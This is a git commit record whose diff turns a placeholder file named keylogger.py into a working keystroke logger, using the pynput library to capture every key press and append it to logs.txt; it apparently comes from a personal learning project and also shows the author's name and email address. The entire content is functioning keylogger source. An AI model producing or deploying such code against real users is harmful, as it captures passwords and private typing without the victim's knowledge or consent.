19b9a0e872e0af02f3d84989a1c1df97156fec63
Zaid Arif <zaid.zrf@gmail.com>
2024-10-17 15:53:28 +0530

    Listening for keystrokes and joining them

--- keylogger.py
+++ keylogger.py
@@ -1,2 +1,9 @@
-with open("logs.txt", "a") as file:
-    file.write("Hello Again\n")
+from pynput.keyboard import Listener
+
+def writeToFile(key):
+    keyData = str(key)
+    with open("logs.txt", "a") as file:
+        file.write(keyData)
+
+with Listener(on_press=writeToFile) as myListener:
+    myListener.join()
